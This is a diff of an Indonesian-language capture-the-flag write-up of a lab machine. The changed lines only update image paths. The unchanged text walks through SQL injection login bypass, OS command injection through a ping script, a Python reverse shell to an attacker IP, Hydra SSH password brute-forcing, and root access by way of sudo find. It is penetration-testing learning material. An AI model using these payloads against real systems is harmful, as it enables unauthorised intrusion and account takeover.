@@ -29,7 +29,7 @@ nmap -sV -sC -p- 10.49.182.70
 ```
 ![](../assets/img/posts/3-writeup-operationpromotion/operation1.png)
 berdasarkan hasil scanning tersebut terdapat beberapa service dan port yang ditemukan. disini  saya melihat pada http terdapat file **robots.txt** dimana di dalamnya memberitahukan terdapat 1 entri yang dilarang di indeks oleh search engine, yaitu direktori `/admin`.
-![](../luminis/images/posts/operation2.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation2.png)
 setelah menemukan entri `/admin/` dari hasil scan **robots.txt**, langkah selanjutnya  adalah mengakses halaman tersebut melalui web browser di alamat `http://10.49.182.70/admin`.
 Halaman ini menampilkan sebuah form login yang meminta Username dan Password.
 
@@ -37,20 +37,20 @@ Untuk menguji apakah form login tersebut rentan terhadap SQL Injection Auth Bypa
 ```
 admin' OR 1=1-- 
 ```
-![](../luminis/images/posts/operation3.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation3.png)
 
 setelah berhasil masuk ke halaman admin menggunakan teknik bypass ini terdapat fitur  user lookup. fitur ini memungkinkan saya melihat data user yang ada di database berdasarkan user id yang di inputkan.
-![](../luminis/images/posts/operation4.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation4.png)
 
 setelah melakukan enumerasi id secara berurutan ditemukan sebuah akun sistem yang sangat  menarik. dimana notes pada profil tersebut memberikan informasi sensitif berupa lokasi script pemeliharaan tersembungi, yaitu direktori `/admin/sysmaint-checks/ping.php`. Fitur berbasis "ping" seperti ini umumnya berinteraksi langsung dengan _system command_ pada server backend.
-![](../luminis/images/posts/operation5.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation5.png)
 kemudian setelah mengakses halaman tersebut. akan menampilkah bahwa script `ping.php` menerima input melalui method  **GET** menggunakan parameter **host**
-![](../luminis/images/posts/operation6.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation6.png)
 Artinya, jika kita ingin mengirimkan instruksi ke skrip ini, kita harus menyisipkannya langsung pada URL (Query String), misalnya:
 ```
 http://10.49.182.70/admin/sysmaint-checks/ping.php?host=127.0.0.1;whoami
 ```
-![](../luminis/images/posts/operation7.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation7.png)
 berdasarkan hasil tersebut membuktikan bahwa aplikasi web tersebut rentan terhadap OS Command Injection. Karakter titik koma ( **;** ) berhasil memisahkan command **ping** asli bawaan server dengan command **whoami** yang telah di sisipkan, dan server mengeksekusinya dengan privilege user **www-data**.
 
 
@@ -61,17 +61,17 @@ Langkah berikutnya adalah meningkatkan akses dari sekedar mengeksekusi perintah 
 nc -lvnp 4444
 ```
 
-![](../luminis/images/posts/operation8.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation8.png)
 
 - Mengirim Payload Reverse Shell berbasis Python melalui parameter **host**
 ```python
 127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.116.113",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
 ```
-![](../luminis/images/posts/operation9.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation9.png)
 - Staging & Stabilisasi Shell: Setelah payload di eksekusi di browser, terminal Netcat pada mesin attacker akan menerima koneksi dari server target. untuk mempermudah proses pencarian flag dan navigasi, shell tersebut distabilkan dengan cara sebagai berikut:
 
 di dalam terminal reverse shell, tekan `Ctrl + z`untuk memindahkan listener Netcat ke background
-![](../luminis/images/posts/operation10.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation10.png)
 lalu jalankan command berikut untuk mengabaikan karakter kontrol lokal dan meneruskanya langsung ke target
 ```
 stty raw -echo; fg
@@ -82,44 +82,44 @@ kemudian click ENTER, dan setelah shell kembali aktif, atur environmental variab
 export TERM=xterm
 ```
 
-![](../luminis/images/posts/operation11.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation11.png)
 
 setelah berhasil menstabilkan interactive shell sebagai user **www-data**, langkah selanjutnya adalah melakukan inspeksi terhadap direktori internal aplikasi web untuk mencari informasi sensitif yang tertinggal.
 
 selama proses ini ditemukan di dalam folder `/var/www/html`, sebuah direktori bernama **config**. Di dalamnya, terdapat file konfigurasi bernama **db.conf**.
-![](../luminis/images/posts/operation12.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation12.png)
 
 setelah mengektrak hash tersebut , dilakukan upaya offline password cracking dengan tools john the ripper dengan memanfaatkan wordlist `rockyou.txt`. Namun setelah berjalan beberapa waktu,proses tersebut tidak membuahkan hasil. saya memutuskan untuk kembali memeriksa halaman utama (index) dari portal **RecruitCorp**.Di sinilah pentingnya melakukan analisis kontekstual. saya memperhatikan ada beberapa kata kunci berulang yang cukup mencolok di halaman tersebut.
 
 Salah satu pola yang menarik perhatian saya adalah penggunaan kata-kata yang merujuk pada nama musim (**"Seasons"**) yang bersanding dengan keterangan tahun (**"Years"**). Di dunia nyata, kombinasi seperti ini—misalnya nama musim diikuti oleh angka tahun—merupakan salah satu pola dasar yang sangat populer digunakan oleh karyawan atau administrator untuk membuat kata sandi karena mudah diingat namun memenuhi syarat kompleksitas standar.
 
 Tentu saja, kata sandi sederhana seperti kata **"Summer"** atau angka **"2026"** tidak akan bisa menembus sistem jika kita mengujinya secara mentah dan terpisah. Kekuatan dari teknik ini terletak pada bagaimana kita memanipulasi, merekayasa, dan menyatukan elemen-elemen kata kunci tersebut menjadi satu kesatuan yang dinamis. Oleh karena itu, langkah strategis saya berikutnya adalah memanfaatkan temuan ini untuk menyusun sebuah _custom wordlist_ yang jauh lebih terarah dan efisien.
-![](../luminis/images/posts/operation13.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation13.png)
 
 Setelah merumuskan hipotesis mengenai pola kata sandi yang berbasis pada kombinasi musim dan tahun, saya memutuskan untuk menggunakan basis kata kunci **`spring2026`** sebagai titik awal. Namun, karena kata sandi mentah ini tidak akan berhasil jika digunakan secara langsung, saya harus memperluas variasinya secara otomatis menggunakan teknik _Rule-Based Attack_.
 
 ```
 echo "spring2026" > password_base.txt
 ```
-![](../luminis/images/posts/operation14.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation14.png)
 Untuk mengeksekusi strategi ini, saya menggunakan **Hashcat** di mesin penyerang  dengan memanfaatkan salah satu aturan mutasi yang sangat kuat, yaitu `dive.rule`. Aturan `dive.rule` ini secara dinamis memanipulasi kata dasar **spring2026** hingga menghasilkan hampir 100.000 kemungkinan kata sandi yang bervariasi (mulai dari perubahan kapitalisasi seperti **Spring2026!**, penambahan simbol, hingga modifikasi struktur teks lainnya).
 
 Perintah Hashcat yang saya eksekusi:
 ```
 hashcat --stdout password_base.txt -r /opt/hashcat/rules/dive.rule > wordlist.txt
 ```
-![](../luminis/images/posts/operation15.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation15.png)
 langkah berikutnya adalah meluncurkan _dictionary attack_ menggunakan **Hydra**. Serangan ini diarahkan langsung ke layanan SSH pada server target dengan menargetkan nama pengguna **`jford`** yang sebelumnya telah kita identifikasi dari file konfigurasi.
 
 ```
 hydra -l jford -P wordlist operation-promotion.thm ssh
 ```
-![](../luminis/images/posts/operation16.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation16.png)
 Dengan kredensial sah ini, saya segera login melalui ssh:
 ```
 ssh jford@operation-promotion.thm
 ```
-![](../luminis/images/posts/operation17.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation17.png)
 
 Setelah berhasil masuk sebagai user **jford**, prioritas utama berikutnya adalah menavigasi ke direktori rumah (_home directory_) pengguna tersebut untuk mencari dan mengekstrak flag pertama, yaitu **User Flag** (`user.txt`).
 
@@ -130,16 +130,16 @@ Langkah awal yang paling standar dan cepat untuk mencari miskonfigurasi internal
 ```
 sudo -l
 ```
-![](../luminis/images/posts/operation18.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation18.png)
 Merujuk pada dokumentasi  [GTFOBins](https://gtfobins.org/gtfobins/find/#shell) (repositori kurasi biner Linux yang dapat disalahgunakan untuk melompati pembatasan keamanan), utilitas `find` memiliki parameter `-exec`. Parameter ini berfungsi untuk menjalankan perintah shell tambahan pada berkas yang ditemukan.
-![](../luminis/images/posts/operation19.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation19.png)
 Karena `find` berjalan dengan hak istimewa **root**, perintah yang disisipkan di dalam `-exec` juga akan otomatis dieksekusi dengan privilese tertinggi ( **root**).
 
 Payload eksploitasi yang digunakan adalah:
 ```
 sudo find . -exec /bin/sh \; -quit
 ```
-![](../luminis/images/posts/operation20.png)
+![](../assets/img/posts/3-writeup-operationpromotion/operation20.png)
 Sesaat setelah perintah tersebut dieksekusi, _prompt_ shell akan berubah menjadi tanda pagar (`#`), menandakan kita telah sukses menjadi **root**.
 
 Langkah penutup adalah mengambil bendera akhir (_Root Flag_) yang biasanya terletak di dalam direktori `/root/`
